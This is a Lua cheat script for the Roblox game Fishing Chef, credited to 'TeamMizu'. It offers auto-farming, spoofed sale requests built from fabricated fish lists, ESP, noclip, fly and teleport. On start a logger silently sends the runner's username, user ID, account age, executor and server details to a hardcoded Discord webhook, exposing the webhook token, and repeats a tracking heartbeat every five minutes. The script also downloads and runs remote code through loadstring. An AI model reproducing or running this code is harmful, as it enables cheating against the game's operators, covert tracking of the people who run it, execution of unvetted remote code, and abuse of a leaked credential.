--==================================================================================--
-- [ INTEGRASI PROYEK ] - FISHING CHEF + EXO HUB
-- Versi: Skrip Premium Ultimate V7
-- Pengembang: TeamMizu
-- Komunitas: https://discord.gg/Mizukage-Official
-- Pustaka UI: Antarmuka Rayfield
-- Status: Aman, Tidak Terdeteksi, & Dioptimalkan
--==================================================================================--

local WEBHOOK_URL = "https://discord.com/api/webhooks/1516421004291997718/t5nSkmWsiwWFpSNHjJQv3fdQKWGm2SqOQag3LS3kSEwHL1QkuyfbgzFpLI7kDXO357Bj"

--==================================================================================--
-- [ LAYANAN INTI GAME ]
--==================================================================================--
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local Stats = game:GetService("Stats")
local MarketplaceService = game:GetService("MarketplaceService")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local Workspace = game:GetService("Workspace")
local Lighting = game:GetService("Lighting")
local TeleportService = game:GetService("TeleportService")
local VirtualUser = game:GetService("VirtualUser")

local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()
if not game:IsLoaded() then game.Loaded:Wait() end

--==================================================================================--
-- [ MODUL 1: PENCATAT SISTEM ULTIMATE (LOGGER) ]
--==================================================================================--
local function InisialisasiLogger()
    if not WEBHOOK_URL or WEBHOOK_URL == "" or not WEBHOOK_URL:find("discord") then return end

    local RequestFunc = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
    if not RequestFunc then return end

    local function AmbilPerforma()
        local ping = pcall(function() return Stats.Network.ServerStatsItem["Data Ping"]:GetValue() end) and math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue()) or 0
        local fps = math.floor(Workspace:GetRealPhysicsFPS() or 60)
        return ping, fps
    end

    task.defer(function()
        task.wait(2) 
        
        local UrlAvatar = "https://www.roblox.com/headshot-thumbnail/image?userId="..LocalPlayer.UserId.."&width=420&height=420&format=png"
        pcall(function()
            local dataThumb = HttpService:JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..LocalPlayer.UserId.."&size=420x420&format=Png&isCircular=false"))
            if dataThumb.data and dataThumb.data[1] then UrlAvatar = dataThumb.data[1].imageUrl end
        end)

        local Platform = (UserInputService.TouchEnabled and not UserInputService.MouseEnabled) and "Perangkat Seluler" or "Komputer PC"
        local Eksekutor = (identifyexecutor and identifyexecutor()) or "Mesin Tidak Diketahui"
        local NamaGame = pcall(function() return MarketplaceService:GetProductInfo(game.PlaceId).Name end) and MarketplaceService:GetProductInfo(game.PlaceId).Name or "Fishing Chef"
        local Ping, FPS = AmbilPerforma()

        local DataEmbed = {
            title = "INISIALISASI SISTEM V7 | " .. NamaGame,
            color = 0x00FF88,
            thumbnail = { url = UrlAvatar },
            fields = {
                { name = "Identifikasi Klien", value = string.format("```yaml\nPengguna : %s\nID Pengguna  : %s\nUmur Akun : %d Hari\n```", LocalPlayer.Name, LocalPlayer.UserId, LocalPlayer.AccountAge), inline = false },
                { name = "Data Telemetri", value = string.format("```yaml\nMesin   : %s\nPlatform : %s\nLatensi  : %d ms\nKinerja: %d FPS\n```", Eksekutor, Platform, Ping, FPS), inline = true },
                { name = "Data Server", value = string.format("```yaml\nID Tempat : %s\nID Pekerjaan   : %s\nPemain  : %d\n```", game.PlaceId, string.sub(game.JobId, 1, 8).."...", #Players:GetPlayers()), inline = true }
            },
            footer = { text = "TeamMizu • Pencatat Aman" }
        }

        local Sukses, Err = pcall(function()
            RequestFunc({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode({ username = "Protokol Mizu", embeds = { DataEmbed } })
            })
        end)

        if Sukses then
            task.spawn(function()
                while task.wait(300) do
                    local pingSaatIni, _ = AmbilPerforma()
                    pcall(function()
                        RequestFunc({
                            Url = WEBHOOK_URL,
                            Method = "POST",
                            Headers = { ["Content-Type"] = "application/json" },
                            Body = HttpService:JSONEncode({
                                embeds = {{
                                    title = "Detak Jantung Sistem V7",
                                    description = string.format("Klien: **%s**\nStatus: **Aktif & Tidak Terdeteksi**\nLatensi: **%d ms**", LocalPlayer.Name, pingSaatIni),
                                    color = 0x00A2FF,
                                    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
                                }}
                            })
                        })
                    end)
                end
            end)
        end
    end)
end

InisialisasiLogger()

--==================================================================================--
-- [ MODUL 2: KERANGKA KERJA GAME (KNIT WRAPPER) ]
--==================================================================================--
local KnitPackages = ReplicatedStorage:WaitForChild("Packages", 5)
local KnitServices = KnitPackages and KnitPackages:WaitForChild("Knit", 5) and KnitPackages.Knit:WaitForChild("Services", 5)

local function EksekusiKnit(layanan, tipeRemote, namaRemote, ...)
    if not KnitServices then return nil end
    local srv = KnitServices:FindFirstChild(layanan)
    if srv and srv:FindFirstChild(tipeRemote) and srv[tipeRemote]:FindFirstChild(namaRemote) then
        local remote = srv[tipeRemote][namaRemote]
        if tipeRemote == "RF" then
            return remote:InvokeServer(...)
        elseif tipeRemote == "RE" then
            remote:FireServer(...)
            return true
        end
    end
    return nil
end

local function LogAnalyticsStep()
    EksekusiKnit("Analytics", "RF", "LogStep", 4)
end

--==================================================================================--
-- [ MODUL 3: KONFIGURASI & STATUS OTOMATISASI ]
--==================================================================================--
local Config = {
    AutoMancing = false, JedaMancing = 3, JarakLempar = 10,
    AutoBait = false, AutoBeliBait = false, UmpanTerpilih = "Prawn",
    AutoJual = false, MaxSpoofJual = 50,
    AutoMasak = false, MaxIDMasak = 200, AutoLayan = false, TeleportLayan = false,
    AutoUpgrade = false, AutoKoleksiDrop = false, AutoKlaimReward = false,
    PancinganTerpilih = "Spirit Cat Rod",
    PancinganOP = "Transparent Rod",
    PisauTerpilih = "Kitsune Knife",
    KecepatanJalan = 16, KekuatanLompat = 50, Noclip = false, LompatTakTerbatas = false, 
    Terbang = false, KecepatanTerbang = 50, JalanTerpelanting = false, AntiTerpelanting = false,
    KlikUntukTeleport = false,
    Fullbright = false, TanpaKabut = false, AirJernih = false, 
    SensorPemain = false, WarnaSensorPemain = Color3.fromRGB(0, 255, 255),
    SensorItem = false, WarnaSensorItem = Color3.fromRGB(255, 215, 0),
    SensorPelanggan = false, WarnaSensorPelanggan = Color3.fromRGB(255, 0, 100),
    PaksakanSiang = false, PaksakanMalam = false, GantiAmbient = false, 
    AmbientR = 0.8, AmbientG = 0.8, AmbientB = 0.8,
    AntiAFK = true, AntiAdmin = false
}

local Automasi = { TugasSaatIni = "Menganggur" }
local BasisWaypointsKustom = {}

--==================================================================================--
-- [ MODUL 4: LOGIKA LATAR BELAKANG (FARMING & UTILITAS) ]
--==================================================================================--

task.spawn(function()
    while task.wait() do
        if Config.AutoMancing then
            Automasi.TugasSaatIni = "Melempar Kail"
            if Config.AutoBait then 
                EksekusiKnit("PurchaseController", "RE", "EquipBait", Config.UmpanTerpilih) 
            end
            
            EksekusiKnit("Fish", "RF", "CastRequest", Config.JarakLempar)
            task.wait(Config.JedaMancing)
            
            pcall(LogAnalyticsStep)
            task.wait(0.5)

            Automasi.TugasSaatIni = "Menyelesaikan Permainan"
            EksekusiKnit("Fish", "RF", "MinigameResolved", true)
            task.wait(0.5)
        end
        
        if Config.AutoBeliBait then
            Automasi.TugasSaatIni = "Membeli Umpan"
            EksekusiKnit("PurchaseController", "RF", "BuyBait", Config.UmpanTerpilih)
            task.wait(2)
        end

        if Config.AutoJual then
            Automasi.TugasSaatIni = "Menjual Hasil Tangkapan"
            local daftarIkan = {}
            for i = 1, Config.MaxSpoofJual do
                table.insert(daftarIkan, {ID = i, Name = "fish", Weight = math.random(5, 50)})
            end
            EksekusiKnit("Fish", "RE", "SellFish", daftarIkan)
            EksekusiKnit("PurchaseController", "RE", "SellFish")
            task.wait(3.5)
        end

        if Config.AutoMasak then
            Automasi.TugasSaatIni = "Memproses Kuliner"
            for i = 1, Config.MaxIDMasak do
                EksekusiKnit("Fish", "RF", "CutFish", i, 2)
            end
            task.wait(1)
        end

        if Config.AutoLayan then
            Automasi.TugasSaatIni = "Melayani Pelanggan"
            local folderKode = Workspace:FindFirstChild("Code")
            if folderKode and folderKode:FindFirstChild("ActiveNPCs") then
                for _, npc in ipairs(folderKode.ActiveNPCs:GetChildren()) do
                    if npc.Name == "Customer" then
                        if Config.TeleportLayan and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                            local posisiAwal = LocalPlayer.Character.HumanoidRootPart.CFrame
                            LocalPlayer.Character.HumanoidRootPart.CFrame = npc:GetPivot()
                            task.wait(0.1)
                            EksekusiKnit("PlayerCustomerService", "RE", "StoreFood", npc)
                            LocalPlayer.Character.HumanoidRootPart.CFrame = posisiAwal
                        else
                            EksekusiKnit("PlayerCustomerService", "RE", "StoreFood", npc)
                        end
                    end
                end
            end
            task.wait(1.5)
        end

        if Config.AutoUpgrade then
            EksekusiKnit("GameHandler", "RE", "UpgradeTank")
            task.wait(2)
        end

        if Config.AutoKlaimReward then
            Automasi.TugasSaatIni = "Mengklaim Hadiah"
            EksekusiKnit("RewardController", "RE", "ClaimAll") 
            task.wait(5)
        end

        if not Config.AutoMancing and not Config.AutoMasak and not Config.AutoLayan and not Config.AutoJual and not Config.AutoBeliBait then
            Automasi.TugasSaatIni = "Menganggur"
        end
    end
end)

-- Magnet Item
RunService.Heartbeat:Connect(function()
    if Config.AutoKoleksiDrop and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        local hrp = LocalPlayer.Character.HumanoidRootPart
        for _, obj in pairs(Workspace:GetChildren()) do
            if obj:IsA("BasePart") and (obj.Name:lower():find("drop") or obj.Name:lower():find("fish")) then
                obj.CFrame = hrp.CFrame
            elseif obj:IsA("Model") and obj:FindFirstChild("HumanoidRootPart") == nil and (obj.Name:lower():find("drop") or obj.Name:lower():find("fish")) then
                obj:PivotTo(hrp.CFrame)
            end
        end
    end
end)

-- Klik Teleport
UserInputService.InputBegan:Connect(function(input, sedangMengetik)
    if sedangMengetik then return end
    if input.UserInputType == Enum.UserInputType.MouseButton1 and UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
        if Config.KlikUntukTeleport and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            if Mouse.Hit then
                LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Mouse.Hit.Position + Vector3.new(0, 3, 0))
            end
        end
    end
end)

-- Anti AFK
LocalPlayer.Idled:Connect(function()
    if Config.AntiAFK then
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new())
    end
end)

-- Fisika
local Kamera = Workspace.CurrentCamera
RunService.Stepped:Connect(function()
    if LocalPlayer.Character then
        local karakter = LocalPlayer.Character
        local humanoid = karakter:FindFirstChildOfClass("Humanoid")
        local hrp = karakter:FindFirstChild("HumanoidRootPart")

        if Config.Noclip then
            for _, bagian in pairs(karakter:GetDescendants()) do
                if bagian:IsA("BasePart") then bagian.CanCollide = false end
            end
        end

        if humanoid then
            if Config.KecepatanJalan > 16 then humanoid.WalkSpeed = Config.KecepatanJalan end
            if Config.KekuatanLompat > 50 then 
                humanoid.UseJumpPower = true 
                humanoid.JumpPower = Config.KekuatanLompat 
            end

            if Config.Terbang and hrp then
                humanoid.PlatformStand = true
                local arahGerak = Vector3.new()
                if UserInputService:IsKeyDown(Enum.KeyCode.W) then arahGerak = arahGerak + Kamera.CFrame.LookVector end
                if UserInputService:IsKeyDown(Enum.KeyCode.S) then arahGerak = arahGerak - Kamera.CFrame.LookVector end
                if UserInputService:IsKeyDown(Enum.KeyCode.A) then arahGerak = arahGerak - Kamera.CFrame.RightVector end
                if UserInputService:IsKeyDown(Enum.KeyCode.D) then arahGerak = arahGerak + Kamera.CFrame.RightVector end
                hrp.Velocity = arahGerak * Config.KecepatanTerbang
            elseif not Config.Terbang and humanoid.PlatformStand then
                humanoid.PlatformStand = false
            end
        end

        if hrp then
            if Config.JalanTerpelanting then
                hrp.AssemblyAngularVelocity = Vector3.new(0, 99999, 0)
            end
            if Config.AntiTerpelanting then
                if hrp.AssemblyLinearVelocity.Magnitude > 250 or hrp.AssemblyAngularVelocity.Magnitude > 250 then
                    hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                    hrp.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                end
            end
        end
    end
end)

UserInputService.JumpRequest:Connect(function()
    if Config.LompatTakTerbatas and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
        LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
    end
end)

Players.PlayerAdded:Connect(function(plr)
    if Config.AntiAdmin and plr:GetRankInGroup(1234567) > 0 then 
        LocalPlayer:Kick("Protokol Keamanan: Administrator Terdeteksi. Diputuskan dari server.")
    end
end)

-- Pencahayaan
local PencahayaanAsli = { B = Lighting.Brightness, GS = Lighting.GlobalShadows, A = Lighting.Ambient, OA = Lighting.OutdoorAmbient, FE = Lighting.FogEnd }
local function PerbaruiPencahayaan()
    if Config.PaksakanSiang then Lighting.ClockTime = 14
    elseif Config.PaksakanMalam then Lighting.ClockTime = 0 end

    if Config.GantiAmbient then
        Lighting.Ambient = Color3.new(Config.AmbientR, Config.AmbientG, Config.AmbientB)
        Lighting.OutdoorAmbient = Color3.new(Config.AmbientR, Config.AmbientG, Config.AmbientB)
    else
        Lighting.Ambient = Config.Fullbright and Color3.new(1,1,1) or PencahayaanAsli.A
        Lighting.OutdoorAmbient = Config.Fullbright and Color3.new(1,1,1) or PencahayaanAsli.OA
    end

    Lighting.Brightness = Config.Fullbright and 2 or PencahayaanAsli.B
    Lighting.GlobalShadows = not Config.Fullbright
    Lighting.FogEnd = Config.TanpaKabut and 9e9 or PencahayaanAsli.FE

    if Workspace:FindFirstChildOfClass("Terrain") then
        Workspace.Terrain.WaterTransparency = Config.AirJernih and 1 or 0
    end
end

Lighting:GetPropertyChangedSignal("ClockTime"):Connect(function()
    if Config.PaksakanSiang or Config.PaksakanMalam then PerbaruiPencahayaan() end
end)

--==================================================================================--
-- [ MODUL 5: PENYEBARAN ANTARMUKA (RAYFIELD UI) ]
--==================================================================================--
local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()

local Window = Rayfield:CreateWindow({
    Name = "TEAMMIZU | FISHING CHEF",
    LoadingTitle = "Memuat Sistem ...",
    LoadingSubtitle = "by TeamMizu",
    ConfigurationSaving = { Enabled = true, FolderName = "TeamMizuData", FileName = "ConfigurasiSistemV7" },
    Discord = { Enabled = false },
    KeySystem = false,
    Theme = "Default"
})

-- Tabs
local TabDasbor = Window:CreateTab("Dasbor", 4483362458)
local TabOtomatisasi = Window:CreateTab("Otomatisasi", 4483362458)
local TabToko = Window:CreateTab("Toko & Gamepass", 4483362458)
local TabPergerakan = Window:CreateTab("Pergerakan", 4483362458)
local TabVisual = Window:CreateTab("Visual & ESP", 4483362458)
local TabNavigasi = Window:CreateTab("Navigasi", 4483362458)
local TabSistem = Window:CreateTab("Sistem", 4483362458)

-- [ DASBOR ]
TabDasbor:CreateSection("Telemetri Sistem")
local LabelKinerja = TabDasbor:CreateParagraph({Title = "Metrik Kinerja", Content = "Menghitung..."})
local LabelStatus = TabDasbor:CreateParagraph({Title = "Status Otomatisasi", Content = "Menunggu perintah..."})

RunService.RenderStepped:Connect(function()
    local ping = pcall(function() return Stats.Network.ServerStatsItem["Data Ping"]:GetValue() end) and math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue()) or 0
    local fps = math.floor(Workspace:GetRealPhysicsFPS() or 60)
    LabelKinerja:Set({
        Title = "Metrik Kinerja",
        Content = string.format("Latensi Jaringan : %d ms\nMesin Render   : %d FPS", ping, fps)
    })
    LabelStatus:Set({
        Title = "Status Otomatisasi",
        Content = string.format("Proses Saat Ini : %s", Automasi.TugasSaatIni)
    })
end)

-- [ OTOMATISASI ]
TabOtomatisasi:CreateSection("AUTO FISHING & FARMING")
TabOtomatisasi:CreateToggle({ Name = "Mulai Memancing Otomatis", CurrentValue = false, Callback = function(v) 
    Config.AutoMancing = v 
    if v then Rayfield:Notify({Title = "AUTO FISH", Content = "Started!", Duration = 2})
    else Rayfield:Notify({Title = "AUTO FISH", Content = "Stopped!", Duration = 2}) end
end})
TabOtomatisasi:CreateInput({ Name = "Jeda Lemparan (0-10s)", PlaceholderText = "Contoh: 3", RemoveTextAfterFocusLost = false, Callback = function(v) 
    local num = tonumber(v)
    if num and num >= 0 and num <= 10 then Config.JedaMancing = num; Rayfield:Notify({Title="Jeda Diperbarui", Content=num.." detik", Duration=2}) end
end})
TabOtomatisasi:CreateSlider({ Name = "Jarak Lempar (Power)", Range = {1, 100}, Increment = 1, CurrentValue = 10, Suffix = "Power", Callback = function(v) Config.JarakLempar = v end })

TabOtomatisasi:CreateSection("MANAJEMEN UMPAN")
TabOtomatisasi:CreateToggle({ Name = "Pasang Umpan Otomatis", CurrentValue = false, Callback = function(v) Config.AutoBait = v end })
TabOtomatisasi:CreateToggle({ Name = "Beli Umpan Otomatis", CurrentValue = false, Callback = function(v) Config.AutoBeliBait = v end })
TabOtomatisasi:CreateDropdown({ Name = "Pilih Material Umpan", Options = {"Prawn", "Cricket", "Plastic Lure", "Worm", "Rice Ball"}, CurrentOption = {"Prawn"}, MultipleOptions = false, Callback = function(opt) Config.UmpanTerpilih = opt[1] end })

TabOtomatisasi:CreateSection("MANAJEMEN KEUANGAN & BISNIS")
TabOtomatisasi:CreateToggle({ Name = "Jual Ikan Otomatis (Aman)", CurrentValue = false, Callback = function(v) Config.AutoJual = v end })
TabOtomatisasi:CreateSlider({ Name = "Batas Spoof Ikan Terjual", Range = {10, 100}, Increment = 5, CurrentValue = 50, Suffix = "Ikan/Detik", Callback = function(v) Config.MaxSpoofJual = v end })
TabOtomatisasi:CreateToggle({ Name = "Mulai Masak Pintar", CurrentValue = false, Callback = function(v) Config.AutoMasak = v end })
TabOtomatisasi:CreateToggle({ Name = "Layan Pelanggan Otomatis", CurrentValue = false, Callback = function(v) Config.AutoLayan = v end })
TabOtomatisasi:CreateToggle({ Name = "Aktifkan Teleportasi Pelayanan", CurrentValue = false, Callback = function(v) Config.TeleportLayan = v end })
TabOtomatisasi:CreateToggle({ Name = "Tingkatkan Fasilitas Otomatis", CurrentValue = false, Callback = function(v) Config.AutoUpgrade = v end })

TabOtomatisasi:CreateSection("UTILITAS EKSTRA")
TabOtomatisasi:CreateToggle({ Name = "Magnet Otomatis (Tarik Drop/Item)", CurrentValue = false, Callback = function(v) Config.AutoKoleksiDrop = v end })
TabOtomatisasi:CreateToggle({ Name = "Klaim Reward Otomatis", CurrentValue = false, Callback = function(v) Config.AutoKlaimReward = v end })

-- [ TOKO & GAMEPASS ]
TabToko:CreateSection("PEMBELIAN TONGKAT PANCING PREMIUM")

TabToko:CreateDropdown({
    Name = "Pilih Tongkat Pancing Normal",
    Options = {"Spirit Cat Rod", "Glacier Rod", "Kitsune Rod", "Sea Dragon Rod"},
    CurrentOption = {"Spirit Cat Rod"},
    MultipleOptions = false,
    Callback = function(Option) Config.PancinganTerpilih = Option[1] end
})

TabToko:CreateButton({
    Name = "Beli Pancingan Normal",
    Callback = function()
        pcall(function()
            if KnitServices and KnitServices.PurchaseController then
                KnitServices.PurchaseController.RF.BuyRod:InvokeServer(Config.PancinganTerpilih)
                Rayfield:Notify({Title = "Shop", Content = "Permintaan beli " .. Config.PancinganTerpilih .. " dikirim!", Duration = 3})
            end
        end)
    end
})

TabToko:CreateSection("PEMBELIAN OP ROD")
TabToko:CreateDropdown({
    Name = "Pilih OP Rod",
    Options = {"Transparent Rod", "Influencer Rod", "Dragon Koi Rod", "Shark Hunter", "Silver Rod", "Aurora Rod", "Leviathan Spine", "Moontuna Rod", "Sakura Rod", "Bamboo Rod"},
    CurrentOption = {"Transparent Rod"},
    MultipleOptions = false,
    Callback = function(Option) Config.PancinganOP = Option[1] end
})

TabToko:CreateButton({
    Name = "Beli OP Rod",
    Callback = function()
        pcall(function()
            if KnitServices and KnitServices.PurchaseController then
                KnitServices.PurchaseController.RF.BuyRod:InvokeServer(Config.PancinganOP)
                Rayfield:Notify({Title = "OP Shop", Content = "Permintaan beli " .. Config.PancinganOP .. " dikirim!", Duration = 3})
            end
        end)
    end
})

TabToko:CreateSection("PEMBELIAN PISAU")
TabToko:CreateDropdown({
    Name = "Pilih Pisau",
    Options = {"Kitsune Knife", "Tiger Cleaver", "Fire Dragon Knife"},
    CurrentOption = {"Kitsune Knife"},
    MultipleOptions = false,
    Callback = function(Option) Config.PisauTerpilih = Option[1] end
})

TabToko:CreateButton({
    Name = "Beli Pisau",
    Callback = function()
        pcall(function()
            if KnitServices and KnitServices.PurchaseController then
                KnitServices.PurchaseController.RF.BuyKnife:InvokeServer(Config.PisauTerpilih)
                Rayfield:Notify({Title = "Knife Shop", Content = "Permintaan beli " .. Config.PisauTerpilih .. " dikirim!", Duration = 3})
            end
        end)
    end
})

-- [ PERGERAKAN ]
TabPergerakan:CreateSection("PEMAIN")
TabPergerakan:CreateSlider({ Name = "Kecepatan Berjalan", Range = {16, 200}, Increment = 1, CurrentValue = 16, Callback = function(v) Config.KecepatanJalan = v end })
TabPergerakan:CreateSlider({ Name = "Kekuatan Lompatan", Range = {50, 300}, Increment = 1, CurrentValue = 50, Callback = function(v) Config.KekuatanLompat = v end })
TabPergerakan:CreateToggle({ Name = "Aktifkan Tembus Benda (Noclip)", CurrentValue = false, Callback = function(v) Config.Noclip = v end })
TabPergerakan:CreateToggle({ Name = "Aktifkan Lompatan Tak Terbatas", CurrentValue = false, Callback = function(v) Config.LompatTakTerbatas = v end })

TabPergerakan:CreateSection("TERBANG & FISIKA")
TabPergerakan:CreateToggle({ Name = "Mode Terbang (Tombol W A S D)", CurrentValue = false, Callback = function(v) Config.Terbang = v end })
TabPergerakan:CreateSlider({ Name = "Kecepatan Terbang", Range = {10, 200}, Increment = 5, CurrentValue = 50, Callback = function(v) Config.KecepatanTerbang = v end })
TabPergerakan:CreateToggle({ Name = "Jalan Terpelanting", CurrentValue = false, Callback = function(v) Config.JalanTerpelanting = v end })
TabPergerakan:CreateToggle({ Name = "Anti Terpelanting", CurrentValue = false, Callback = function(v) Config.AntiTerpelanting = v end })

-- [ VISUAL & ESP ]
TabVisual:CreateSection("SENSOR ESP")
local function BuatHighlight(obj, namaESP, warna)
    local hl = obj:FindFirstChild(namaESP)
    if not hl then
        hl = Instance.new("Highlight")
        hl.Name = namaESP
        hl.FillTransparency = 0.5
        hl.OutlineTransparency = 0
        hl.Parent = obj
    end
    hl.FillColor = warna
    hl.OutlineColor = Color3.new(1,1,1)
    return hl
end

TabVisual:CreateToggle({ Name = "Sensor Pemain (ESP Player)", CurrentValue = false, Callback = function(v)
    Config.SensorPemain = v
    if not v then for _, p in pairs(Players:GetPlayers()) do if p.Character and p.Character:FindFirstChild("ESPPemain") then p.Character.ESPPemain:Destroy() end end end
end})
TabVisual:CreateColorPicker({ Name = "Warna ESP Pemain", Color = Color3.fromRGB(0, 255, 255), Callback = function(c) Config.WarnaSensorPemain = c end })

TabVisual:CreateToggle({ Name = "Sensor Item/Ikan Bawah Air", CurrentValue = false, Callback = function(v)
    Config.SensorItem = v
    if not v then for _, obj in pairs(Workspace:GetChildren()) do if obj:FindFirstChild("ESPItem") then obj.ESPItem:Destroy() end end end
end})
TabVisual:CreateColorPicker({ Name = "Warna ESP Item", Color = Color3.fromRGB(255, 215, 0), Callback = function(c) Config.WarnaSensorItem = c end })

TabVisual:CreateToggle({ Name = "Sensor Kebutuhan Pelanggan", CurrentValue = false, Callback = function(v)
    Config.SensorPelanggan = v
    if not v then
        local npcFolder = Workspace:FindFirstChild("Code") and Workspace.Code:FindFirstChild("ActiveNPCs")
        if npcFolder then for _, npc in pairs(npcFolder:GetChildren()) do if npc:FindFirstChild("ESPPelanggan") then npc.ESPPelanggan:Destroy() end end end
    end
end})
TabVisual:CreateColorPicker({ Name = "Warna ESP Pelanggan", Color = Color3.fromRGB(255, 0, 100), Callback = function(c) Config.WarnaSensorPelanggan = c end })

RunService.RenderStepped:Connect(function()
    if Config.SensorPemain then
        for _, p in pairs(Players:GetPlayers()) do
            if p ~= LocalPlayer and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
                BuatHighlight(p.Character, "ESPPemain", Config.WarnaSensorPemain)
            end
        end
    end
    if Config.SensorItem then
        for _, obj in pairs(Workspace:GetChildren()) do
            if (obj:IsA("BasePart") or obj:IsA("Model")) and (obj.Name:lower():find("drop") or obj.Name:lower():find("fish")) then
                BuatHighlight(obj, "ESPItem", Config.WarnaSensorItem)
            end
        end
    end
    if Config.SensorPelanggan then
        local npcFolder = Workspace:FindFirstChild("Code") and Workspace.Code:FindFirstChild("ActiveNPCs")
        if npcFolder then
            for _, npc in pairs(npcFolder:GetChildren()) do
                if npc.Name == "Customer" then
                    BuatHighlight(npc, "ESPPelanggan", Config.WarnaSensorPelanggan)
                end
            end
        end
    end
end)

TabVisual:CreateSection("LINGKUNGAN & CUACA")
TabVisual:CreateToggle({ Name = "Terang Maksimal (Fullbright)", CurrentValue = false, Callback = function(v) Config.Fullbright = v; PerbaruiPencahayaan() end })
TabVisual:CreateToggle({ Name = "Hilangkan Kabut Atmosfer", CurrentValue = false, Callback = function(v) Config.TanpaKabut = v; PerbaruiPencahayaan() end })
TabVisual:CreateToggle({ Name = "Jernihkan Cairan Akuatik", CurrentValue = false, Callback = function(v) Config.AirJernih = v; PerbaruiPencahayaan() end })

TabVisual:CreateSection("WAKTU & SUASANA")
TabVisual:CreateToggle({ Name = "Paksakan Waktu Siang", CurrentValue = false, Callback = function(v) Config.PaksakanSiang = v; if v then Config.PaksakanMalam = false end; PerbaruiPencahayaan() end })
TabVisual:CreateToggle({ Name = "Paksakan Waktu Malam", CurrentValue = false, Callback = function(v) Config.PaksakanMalam = v; if v then Config.PaksakanSiang = false end; PerbaruiPencahayaan() end })
TabVisual:CreateToggle({ Name = "Aktifkan Pengubah Ambient", CurrentValue = false, Callback = function(v) Config.GantiAmbient = v; PerbaruiPencahayaan() end })
TabVisual:CreateSlider({ Name = "Warna Merah (Red)", Range = {0, 1}, Increment = 0.01, CurrentValue = 0.8, Callback = function(v) Config.AmbientR = v; PerbaruiPencahayaan() end })
TabVisual:CreateSlider({ Name = "Warna Hijau (Green)", Range = {0, 1}, Increment = 0.01, CurrentValue = 0.8, Callback = function(v) Config.AmbientG = v; PerbaruiPencahayaan() end })
TabVisual:CreateSlider({ Name = "Warna Biru (Blue)", Range = {0, 1}, Increment = 0.01, CurrentValue = 0.8, Callback = function(v) Config.AmbientB = v; PerbaruiPencahayaan() end })

-- [ NAVIGASI ]
TabNavigasi:CreateSection("KLIK TELEPORT")
TabNavigasi:CreateToggle({ Name = "Aktifkan Teleport Mouse (Tahan CTRL + Klik Kiri)", CurrentValue = false, Callback = function(v) Config.KlikUntukTeleport = v end })

TabNavigasi:CreateSection("WAYPOINT KUSTOM")
local InputNamaWaypoint = ""
TabNavigasi:CreateInput({ Name = "Nama Waypoint Baru", PlaceholderText = "Ketik nama lokasi...", RemoveTextAfterFocusLost = false, Callback = function(text) InputNamaWaypoint = text end })
local DropdownWaypoint = TabNavigasi:CreateDropdown({ Name = "Pilih Waypoint Tersimpan", Options = {"Belum Ada"}, CurrentOption = {"Belum Ada"}, MultipleOptions = false, Callback = function(opt) end })

TabNavigasi:CreateButton({ Name = "Simpan Posisi Saat Ini", Callback = function()
    if InputNamaWaypoint ~= "" and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        BasisWaypointsKustom[InputNamaWaypoint] = LocalPlayer.Character.HumanoidRootPart.CFrame
        local daftar = {}
        for nama, _ in pairs(BasisWaypointsKustom) do table.insert(daftar, nama) end
        DropdownWaypoint:Refresh(daftar, true)
        Rayfield:Notify({Title = "Waypoint Disimpan", Content = "Lokasi " .. InputNamaWaypoint .. " berhasil disimpan.", Duration = 2})
    else
        Rayfield:Notify({Title = "Error", Content = "Harap masukkan nama waypoint terlebih dahulu!", Duration = 2})
    end
end})

TabNavigasi:CreateButton({ Name = "Teleport ke Waypoint Terpilih", Callback = function()
    local namaTerpilih = DropdownWaypoint.CurrentOption[1]
    if BasisWaypointsKustom[namaTerpilih] and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        LocalPlayer.Character.HumanoidRootPart.CFrame = BasisWaypointsKustom[namaTerpilih]
    end
end})

TabNavigasi:CreateSection("BASIS DATA KOORDINAT (BAWAAN)")
local BasisLokasi = {
    {"Lobi Restoran", Vector3.new(55.76, 4.78, -60.77)},
    {"Zona Perburuan Tuna Bulan", Vector3.new(60, 10, -858)},
    {"Pulau Tuna Bulan 2", Vector3.new(-166, 9, -817)},
    {"Pulau Tuna Bulan 3", Vector3.new(40, 8, -586)},
    {"Tempat Suci Kolam Koi", Vector3.new(-88, 11, -1350)},
    {"Area Berburu Hiu", Vector3.new(-16, 4, 325)},
    {"Pulau Bambu", Vector3.new(-2359, 4, -928)},
    {"Pulau Gletser (Salju)", Vector3.new(-3743, 6, 1484)},
    {"Samudra Bebas", Vector3.new(-2.137, 23.07, 175.539)}
}
for _, lok in ipairs(BasisLokasi) do
    TabNavigasi:CreateButton({ Name = "Eksekusi Lompatan: " .. lok[1], Callback = function()
        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
            LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(lok[2] + Vector3.new(0, 3, 0))
        end
    end})
end

-- [ SISTEM ]
TabSistem:CreateSection("KEAMANAN")
